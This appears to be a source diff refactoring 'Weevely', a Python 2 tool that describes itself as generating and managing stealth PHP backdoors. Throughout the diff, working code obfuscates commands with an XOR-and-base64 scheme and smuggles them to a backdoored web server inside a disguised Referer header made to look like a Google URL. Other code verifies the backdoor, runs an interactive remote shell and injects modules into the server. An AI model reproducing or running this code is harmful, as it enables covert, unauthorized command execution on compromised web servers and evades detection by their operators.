@@ -4,10 +4,20 @@
 from numpy import frombuffer, bitwise_xor, byte
 import getopt, sys, base64, os, urllib2, re, urlparse, os
     
+def crypt(text, key):
+  text = frombuffer( text, dtype=byte )
+  firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
+  strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
+  strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
+  
+  bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
+  
+  toret = base64.b64encode(bit.tostring())
+  return toret     
+    
 class weevely:
   
   modules = {}
-  os=''
   
   def main(self):
     
@@ -48,20 +58,18 @@ class weevely:
 	if o in ("-o", "-output"):
 	  outfile=a
 
+    # Start
     if 'moderun' in locals():
-
+  
       if moderun=='c' or moderun=='t' or moderun=='m':
+	
 	if 'url' not in locals():
 	  print "! Please specify URL (-u)"
 	  sys.exit(1)
-	  
 	
-	(ret,ret2, e, e2) = self.checkbackdoor(url, pwd)
-	if not ret or not ret2:
-	  print '! Backdoor verification failed: ' + str(e) + '.' 
-	  return
-	os=ret2
+	self.host=host(url,pwd)
 	
+
       if moderun=='g':
 	if 'outfile' not in locals():
 	  print "! Please specify where generate backdoor file (-o)"
@@ -78,7 +86,7 @@ class weevely:
 
       if moderun=='c':       
 	try:
-	  print self.execute(url, pwd, cmnd, 0)
+	  print self.host.execute(url, pwd, cmnd, 0)
 	except Exception, e:
 	  print '! Command execution failed: ' + str(e) + '.'
 	return
@@ -114,40 +122,6 @@ class weevely:
   def banner(self):
     print "+ Weevely - Generate and manage stealth PHP backdoors.\n+"
 
-     
-  def crypt(self, text, key):
-    text = frombuffer( text, dtype=byte )
-    firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
-    strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
-    strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
-    
-    bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
-    
-    toret = base64.b64encode(bit.tostring())
-    return toret 
-
-  def execute(self, url, pwd, cmnd, mode):
-    cmnd=cmnd.strip()
-    cmdstr=self.crypt(cmnd,pwd)
-    refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
-    try: 
-      ret=self.execHTTPGet(refurl,url)
-    except urllib2.URLError, e:
-      raise
-    else: 
-      restring='<' + pwd + '>(.*)</' + pwd + '>'
-      e = re.compile(restring,re.DOTALL)
-      founded=e.findall(ret)
-      if len(founded)<1:
-	raise Exception('request doesn\'t produce a valid respond, check password or url')
-      else:
-	return founded[0].strip()
-    
-  def execHTTPGet(self, refurl, url):
-    req = urllib2.Request(url)
-    req.add_header('Referer', refurl)
-    r = urllib2.urlopen(req)
-    return r.read()
     
   def terminal(self, url, pwd):
     
@@ -157,7 +131,7 @@ class weevely:
       print hostname + '> ',
       cmnd = sys.stdin.readline()
       if cmnd!='\n':
-	print self.execute(url, pwd, cmnd, 0)
+	print self.host.execute(url, pwd, cmnd, 0)
 
   def generate(self,key,path):
     f_tocrypt = file('php/text_to_crypt.php')
@@ -165,12 +139,12 @@ class weevely:
     f_output = file(path,'w')
     
     str_tocrypt = f_tocrypt.read()
-    str_crypted = self.crypt(str_tocrypt,key)
+    str_crypted = crypt(str_tocrypt,key)
     str_back = f_back.read()
     new_str = str_back.replace('%%%TEXT-CRYPTED%%%', str_crypted)
     
     f_output.write(new_str)
-    print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the PHP file as is. Exiting.'
+    print '+ Backdoor file ' + path + ' created with password '+ key + '.'
 
   def execmodule(self, url, pwd, modulestring, os):
     
@@ -189,8 +163,8 @@ class weevely:
 	  return
        
       if m.has_key('os'):
-	if os not in self.modules[modname]['os']:
-	  print '- Warning: remote system \'' + os + '\' and module supported system/s \'' + ','.join(self.modules[modname]['os']).strip() + '\' seems not compatible.'
+	if self.host.os not in self.modules[modname]['os']:
+	  print '- Warning: remote system \'' + self.host.os + '\' and module supported system/s \'' + ','.join(self.modules[modname]['os']).strip() + '\' seems not compatible.'
 	  print '- Press enter to continue or control-c to exit'
 	  sys.stdin.readline()
 	
@@ -200,7 +174,7 @@ class weevely:
       toinject = toinject + f.read()
       
       try:
-	ret = self.execute(url, pwd, toinject, 1)
+	ret = self.host.execute(url, pwd, toinject, 1)
       except Exception, e:
 	print '! Module execution failed: ' + str(e) + '.'
 	return
@@ -259,11 +233,24 @@ class weevely:
 	e = re.compile(restring)
 	founded=e.findall(modstr)
 	if founded:
-	  #module['os']=founded[0].split(',')
 	  module['os'] = [v.strip() for v in founded[0].split(',')]
 
 	self.modules[module['name']]=module
      
+    
+class host():
+  
+  os=''
+  
+  def __init__(self,url,pwd):
+    self.url=url
+    self.pwd=pwd
+    
+    (ret,ret2, e, e2) = self.checkbackdoor(url, pwd)
+    if not ret or not ret2:
+      print '! Backdoor verification failed: ' + str(e) + '.' 
+      return
+    self.os=ret2
 
   def checkbackdoor(self,url,pwd):
     
@@ -285,6 +272,31 @@ class weevely:
       ret = False
     
     return ret, ret2, e, e2
+	
+
+  def execute(self, url, pwd, cmnd, mode):
+    cmnd=cmnd.strip()
+    cmdstr=crypt(cmnd,pwd)
+    refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
+    try: 
+      ret=self.execHTTPGet(refurl,url)
+    except urllib2.URLError, e:
+      raise
+    else: 
+      restring='<' + pwd + '>(.*)</' + pwd + '>'
+      e = re.compile(restring,re.DOTALL)
+      founded=e.findall(ret)
+      if len(founded)<1:
+	raise Exception('request doesn\'t produce a valid respond, check password or url')
+      else:
+	return founded[0].strip()
+
+    
+  def execHTTPGet(self, refurl, url):
+    req = urllib2.Request(url)
+    req.add_header('Referer', refurl)
+    r = urllib2.urlopen(req)
+    return r.read()    
     
 if __name__ == "__main__":
     
